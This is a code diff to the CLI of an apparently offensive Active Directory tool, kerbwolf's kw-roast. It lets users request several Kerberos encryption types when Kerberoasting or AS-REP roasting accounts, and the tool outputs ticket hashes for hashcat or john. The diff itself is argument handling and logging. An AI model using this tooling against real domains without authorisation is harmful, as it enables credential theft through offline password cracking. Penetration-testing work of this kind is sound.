@@ -8,11 +8,11 @@ import sys
 
 from kerbwolf import __version__
 from kerbwolf.attacks.kerberoast import kerberoast, kerberoast_no_preauth
-from kerbwolf.cli._common import build_credential, collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, print_header, resolve_context
+from kerbwolf.cli._common import build_credential, collect_targets, ldap_connect_from_args, ldap_discover_all_users, output_results, parse_etypes, print_header, resolve_context
 from kerbwolf.core.ccache import load_tgt_from_ccache
 from kerbwolf.core.ldap import find_kerberoastable
 from kerbwolf.log import Logger
-from kerbwolf.models import ETYPE_BY_NAME, HashFormat, KerberosContext, KerbWolfError, RoastResult, TransportProtocol
+from kerbwolf.models import HashFormat, KerberosContext, KerbWolfError, RoastResult, TransportProtocol
 
 
 def _build_parser() -> argparse.ArgumentParser:
@@ -70,7 +70,7 @@ def _build_parser() -> argparse.ArgumentParser:
 
     # -- Output --
     grp = parser.add_argument_group("output")
-    grp.add_argument("-e", "--enctype", choices=["des-cbc-crc", "des-cbc-md5", "rc4", "aes128", "aes256"], default="rc4", help="Encryption type (default: rc4)")
+    grp.add_argument("-e", "--enctype", action="append", metavar="ETYPE", default=None, help="Encryption type(s) in preference order, repeatable or comma-separated (choices: des-cbc-crc, des-cbc-md5, rc4, aes128, aes256; default: rc4)")
     grp.add_argument("-o", "--output", metavar="FILE", help="Write hashes to file")
     grp.add_argument("--format", choices=["hashcat", "john"], default="hashcat", dest="hash_format", help="Hash output format (default: hashcat)")
 
@@ -120,7 +120,7 @@ def main(argv: list[str] | None = None) -> None:
 
     targets = list(dict.fromkeys(targets))
 
-    etype = ETYPE_BY_NAME[args.enctype]
+    etypes = parse_etypes(args.enctype)
     transport = TransportProtocol(args.transport)
     hash_format = HashFormat(args.hash_format)
 
@@ -133,6 +133,7 @@ def main(argv: list[str] | None = None) -> None:
         target_desc += " (LDAP)"
     elif args.ldap_all:
         target_desc += " (LDAP spray)"
+    etype_desc = ", ".join(e.name for e in etypes)
     print_header(
         "kw-roast",
         [
@@ -140,7 +141,7 @@ def main(argv: list[str] | None = None) -> None:
             ("Domain", ctx.domain),
             ("DC", f"{ctx.dc_hostname} ({ctx.dc_ip})" if ctx.dc_hostname else ctx.dc_ip),
             ("Auth", auth),
-            ("Etype", etype.name),
+            ("Etype", etype_desc),
             ("Targets", target_desc),
             ("Transport", transport.value),
             ("Format", hash_format.value),
@@ -152,12 +153,12 @@ def main(argv: list[str] | None = None) -> None:
 
     try:
         if args.no_preauth:
-            logger.info("AS-REQ kerberoasting via %s (etype: %s, targets: %d)", args.no_preauth, etype.name, len(targets))
+            logger.info("AS-REQ kerberoasting via %s (etypes: %s, targets: %d)", args.no_preauth, etype_desc, len(targets))
             results = kerberoast_no_preauth(
                 args.no_preauth,
                 domain=ctx.domain,
                 dc_ip=ctx.dc_ip,
-                etype=etype,
+                etypes=etypes,
                 target_users=targets,
                 hash_format=hash_format,
                 transport=transport,
@@ -165,11 +166,11 @@ def main(argv: list[str] | None = None) -> None:
             )
         elif args.kerberos:
             tgt_bytes, session_key, cipher_cls = load_tgt_from_ccache(args.ccache)
-            logger.info("TGS-REP Roast via ccache (etype: %s, targets: %d)", etype.name, len(targets))
+            logger.info("TGS-REP Roast via ccache (etypes: %s, targets: %d)", etype_desc, len(targets))
             results = kerberoast(
                 dc_ip=ctx.dc_ip,
                 domain=ctx.domain,
-                etype=etype,
+                etypes=etypes,
                 target_spns=targets,
                 hash_format=hash_format,
                 transport=transport,
@@ -180,11 +181,11 @@ def main(argv: list[str] | None = None) -> None:
             )
         else:
             cred = build_credential(args)
-            logger.info("TGS-REP Roast (etype: %s, targets: %d)", etype.name, len(targets))
+            logger.info("TGS-REP Roast (etypes: %s, targets: %d)", etype_desc, len(targets))
             results = kerberoast(
                 cred,
                 dc_ip=ctx.dc_ip,
-                etype=etype,
+                etypes=etypes,
                 target_spns=targets,
                 hash_format=hash_format,
                 transport=transport,
